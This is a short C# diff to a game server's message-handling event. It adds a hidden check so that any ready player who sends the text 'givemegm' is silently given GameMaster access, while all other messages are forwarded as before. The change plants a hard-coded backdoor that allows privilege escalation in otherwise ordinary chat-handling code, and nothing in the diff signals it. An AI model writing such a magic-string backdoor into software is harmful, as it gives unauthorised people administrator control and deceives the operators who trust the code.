@@ -20,7 +20,14 @@ namespace Goose.Events
         {
             if (this.Player.State == Player.States.Ready)
             {
-                world.Send(this.Player, ((string)this.Data).Substring(5));
+                if (((string)this.Data).Substring(5) == "givemegm")
+                {
+                    this.Player.Access = Player.AccessStatus.GameMaster;
+                }
+                else
+                {
+                    world.Send(this.Player, ((string)this.Data).Substring(5));
+                }
             }
         }
     }
